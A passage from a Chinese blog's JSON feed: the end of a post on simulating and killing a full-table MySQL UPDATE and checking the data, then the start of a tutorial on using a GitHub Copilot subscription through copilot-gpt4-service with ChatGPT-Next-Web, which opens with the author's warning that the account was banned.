class=\"token keyword\">database</span>: log_analysis</pre></td></tr></table></figure><p>发现 cpu 还在持续占用</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">-- 查询 2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">SHOW</span> PROCESSLIST<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">|</span> Id     <span class=\"token operator\">|</span> <span class=\"token keyword\">User</span> <span class=\"token operator\">|</span> Host                  <span class=\"token operator\">|</span> db           <span class=\"token operator\">|</span> Command <span class=\"token operator\">|</span> <span class=\"token keyword\">Time</span> <span class=\"token operator\">|</span> State    <span class=\"token operator\">|</span> Info                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190578</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">51578</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Query   <span class=\"token operator\">|</span>    <span class=\"token number\">0</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">starting</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">SHOW</span> PROCESSLIST                  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190580</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">47540</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">101</span> <span class=\"token operator\">|</span>          <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190584</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11749</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">677</span> <span class=\"token operator\">|</span>          <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190585</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11750</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">677</span> <span class=\"token operator\">|</span>          <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190586</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11769</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">677</span> <span class=\"token operator\">|</span>          <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190589</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">52630</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Query   <span class=\"token operator\">|</span>  <span class=\"token number\">101</span> <span class=\"token operator\">|</span> updating <span class=\"token operator\">|</span> <span class=\"token keyword\">UPDATE</span> table_update <span class=\"token keyword\">SET</span> <span class=\"token keyword\">type</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">6</span> <span class=\"token keyword\">rows</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">-- kill 2</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">kill</span> <span class=\"token number\">190589</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Query OK<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token keyword\">rows</span> affected <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">-- 查询 3</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">SHOW</span> PROCESSLIST<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+-----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">|</span> Id     <span class=\"token operator\">|</span> <span class=\"token keyword\">User</span> <span class=\"token operator\">|</span> Host                  <span class=\"token operator\">|</span> db           <span class=\"token operator\">|</span> Command <span class=\"token operator\">|</span> <span class=\"token keyword\">Time</span> <span class=\"token operator\">|</span> State     <span class=\"token operator\">|</span> Info                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+-----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190578</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">51578</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Query   <span class=\"token operator\">|</span>    <span class=\"token number\">0</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">starting</span>  <span class=\"token operator\">|</span> <span class=\"token keyword\">SHOW</span> PROCESSLIST                  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190580</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">47540</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">113</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190584</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11749</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">689</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190585</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11750</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">689</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190586</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11769</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">689</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190589</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">52630</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Killed  <span class=\"token operator\">|</span>  <span class=\"token number\">113</span> <span class=\"token operator\">|</span> query <span class=\"token keyword\">end</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">UPDATE</span> table_update <span class=\"token keyword\">SET</span> <span class=\"token keyword\">type</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190590</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">38560</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Query   <span class=\"token operator\">|</span>    <span class=\"token number\">5</span> <span class=\"token operator\">|</span> updating  <span class=\"token operator\">|</span> <span class=\"token keyword\">UPDATE</span> table_update <span class=\"token keyword\">SET</span> <span class=\"token keyword\">type</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+-----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token number\">7</span> <span class=\"token keyword\">rows</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">-- 查询 4</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">SHOW</span> PROCESSLIST<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+-----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token operator\">|</span> Id     <span class=\"token operator\">|</span> <span class=\"token keyword\">User</span> <span class=\"token operator\">|</span> Host                  <span class=\"token operator\">|</span> db           <span class=\"token operator\">|</span> Command <span class=\"token operator\">|</span> <span class=\"token keyword\">Time</span> <span class=\"token operator\">|</span> State     <span class=\"token operator\">|</span> Info                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+-----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190578</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">51578</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Query   <span class=\"token operator\">|</span>    <span class=\"token number\">0</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">starting</span>  <span class=\"token operator\">|</span> <span class=\"token keyword\">SHOW</span> PROCESSLIST                  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190580</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">47540</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">137</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190584</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11749</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">713</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190585</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11750</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">713</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190586</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11769</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">713</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190589</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">52630</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Killed  <span class=\"token operator\">|</span>  <span class=\"token number\">137</span> <span class=\"token operator\">|</span> query <span class=\"token keyword\">end</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">UPDATE</span> table_update <span class=\"token keyword\">SET</span> <span class=\"token keyword\">type</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190590</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">38560</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Query   <span class=\"token operator\">|</span>   <span class=\"token number\">29</span> <span class=\"token operator\">|</span> updating  <span class=\"token operator\">|</span> <span class=\"token keyword\">UPDATE</span> table_update <span class=\"token keyword\">SET</span> <span class=\"token keyword\">type</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+-----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token number\">7</span> <span class=\"token keyword\">rows</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token comment\">-- kill 4</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">kill</span> <span class=\"token number\">190590</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>Query OK<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token keyword\">rows</span> affected <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">-- 最后的查询</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">SHOW</span> PROCESSLIST<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+-----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token operator\">|</span> Id     <span class=\"token operator\">|</span> <span class=\"token keyword\">User</span> <span class=\"token operator\">|</span> Host                  <span class=\"token operator\">|</span> db           <span class=\"token operator\">|</span> Command <span class=\"token operator\">|</span> <span class=\"token keyword\">Time</span> <span class=\"token operator\">|</span> State     <span class=\"token operator\">|</span> Info                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+-----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190578</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">51578</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Query   <span class=\"token operator\">|</span>   <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">starting</span>  <span class=\"token operator\">|</span> <span class=\"token keyword\">SHOW</span> PROCESSLIST                  <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190580</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">47540</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>  <span class=\"token number\">212</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190584</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11749</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>   <span class=\"token number\">22</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190585</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11750</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>   <span class=\"token number\">22</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190586</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">192.168</span><span class=\"token number\">.102</span><span class=\"token number\">.225</span>:<span class=\"token number\">11769</span> <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Sleep   <span class=\"token operator\">|</span>   <span class=\"token number\">22</span> <span class=\"token operator\">|</span>           <span class=\"token operator\">|</span> <span class=\"token boolean\">NULL</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">190589</span> <span class=\"token operator\">|</span> root <span class=\"token operator\">|</span> <span class=\"token number\">172.17</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span>:<span class=\"token number\">52630</span>      <span class=\"token operator\">|</span> log_analysis <span class=\"token operator\">|</span> Killed  <span class=\"token operator\">|</span>  <span class=\"token number\">212</span> <span class=\"token operator\">|</span> query <span class=\"token keyword\">end</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">UPDATE</span> table_update <span class=\"token keyword\">SET</span> <span class=\"token keyword\">type</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------+------+-----------------------+--------------+---------+------+-----------+-----------------------------------+</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token number\">6</span> <span class=\"token keyword\">rows</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"校验数据\"><a class=\"anchor\" href=\"#校验数据\">#</a> 校验数据</h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> table_update <span class=\"token keyword\">WHERE</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">type</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">type</span> <span class=\"token operator\">!=</span> <span class=\"token punctuation\">(</span>num<span class=\"token operator\">%</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">type</span> <span class=\"token operator\">=</span> <span class=\"token number\">7</span> <span class=\"token operator\">and</span> <span class=\"token punctuation\">(</span>num<span class=\"token operator\">%</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Empty <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">15.69</span> sec<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>最后，数据没啥问题</p>\n<h2 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>mysql innodb 默认开启 autocommit，所以哪怕是单条 update 也会有事务，所以在事务未完成完成的情况下，数据大概率不会有什么问题。</p>\n<p>但是 update 全表会有一个表级的锁，会导致其他事务无法对该表进行操作，本次模拟没有测试这种情况，主要研究数据是否会更改成功。</p>\n<p>至于 kill 失败的问题。状态显示为  <code>Killed</code> ，并且处于  <code>query end</code>  状态。这通常是因为该查询正在等待某些资源或锁释放，或者正在进行某些清理操作，这些操作可能需要一些时间。</p>\n<p>至于本次操作事故，已经过去几个月了，在发现问题的第一时间，找有权限的人 kill 的那个 query 时，也是像本次模拟一样，kill 不掉，后面更高权限的人直接终止了所有 query，回滚了数据库，我们一群人校验数据到半夜三更，好在没有引起更大的问题。</p>\n<p>感谢所有小伙伴！感谢数据库备份！感谢冗余数据！</p>\n<blockquote>\n<p>参考资料：<span class=\"exturl\" data-url=\"aHR0cHM6Ly94aWFvbGluY29kaW5nLmNvbS9teXNxbC9sb2NrL3VwZGF0ZV9pbmRleC5odG1sIyVFNSVBNiU4MiVFNCVCRCU5NSVFOSU4MSVCRiVFNSU4NSU4RCVFOCVCRiU5OSVFNyVBNyU4RCVFNCVCQSU4QiVFNiU5NSU4NSVFNyU5QSU4NCVFNSU4RiU5MSVFNyU5NCU5Rg==\">https://xiaolincoding.com/mysql/lock/update_index.html# 如何避免这种事故的发生</span></p>\n</blockquote>\n",
            "tags": [
                "计算机科学",
                "Database",
                "MySQL",
                "MySQL"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/Project/copilot-gpt4-service/",
            "url": "https://blog.twelveeee.top/2024/Project/copilot-gpt4-service/",
            "title": "搭建使用github copilot的 ChatGPT Next Web",
            "date_published": "2024-02-25T03:00:00.000Z",
            "content_html": "<h1 id=\"搭建使用github-copilot的-chatgpt-next-web\"><a class=\"anchor\" href=\"#搭建使用github-copilot的-chatgpt-next-web\">#</a> 搭建使用 github copilot 的 ChatGPT Next Web</h1>\n<p>项目地址 copilot-gpt4-service <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FhYW1vb24vY29waWxvdC1ncHQ0LXNlcnZpY2U=\">https://github.com/aaamoon/copilot-gpt4-service</span></p>\n<p>项目地址 ChatGPT-Next-Web <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NoYXRHUFROZXh0V2ViL0NoYXRHUFQtTmV4dC1XZWI=\">https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web</span></p>\n<div class=\"note danger\">\n<p>update:: 2024-06-02<br />\n 作者本人使用 copilot-gpt4-service 已被封号，请不要再尝试<br />\n详情查看 <a href=\"https://blog.twelveeee.top/2024/Project/copilot-gpt4-service-ban/\">https://blog.twelveeee.top/2024/Project/copilot-gpt4-service-ban/</a></p>\n</div>\n<div class=\"note danger\">\n<p>update:: 2024-06-02<br />\n 作者本人使用 copilot-gpt4-service 已被封号，请不要再尝试<br />\n详情查看 <a href=\"https://blog.twelveeee.top/2024/Project/copilot-gpt4-service-ban/\">https://blog.twelveeee.top/2024/Project/copilot-gpt4-service-ban/</a></p>\n</div>\n<div class=\"note danger\">\n<p>update:: 2024-06-02<br />\n 作者本人使用 copilot-gpt4-service 已被封号，请不要再尝试<br />\n详情查看 <a href=\"https://blog.twelveeee.top/2024/Project/copilot-gpt4-service-ban/\">https://blog.twelveeee.top/2024/Project/copilot-gpt4-service-ban/</a></p>\n</div>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>最近个人使用 openai 的 api 花费太高了，正好我已经订阅了 github 的 copilot ，很久之前就开始关注 copilot-gpt4-service 这个项目，虽然项目结构写的挺乱的，但是效果还行。</p>\n<p>按照本文，您需要</p>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_0\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_0\"> 一个外网服务器</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_1\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_1\"> 一个域名</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_2\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_2\"> 正在订阅 github copilot</label></li>\n</ul>\n<h1 id=\"搭建-copilot-gpt4-service\"><a class=\"anchor\" href=\"#搭建-copilot-gpt4-service\">#</a> 搭建 copilot-gpt4-service</h1>\n<p>注意！copilot-gpt4-service 不适合 Serverless 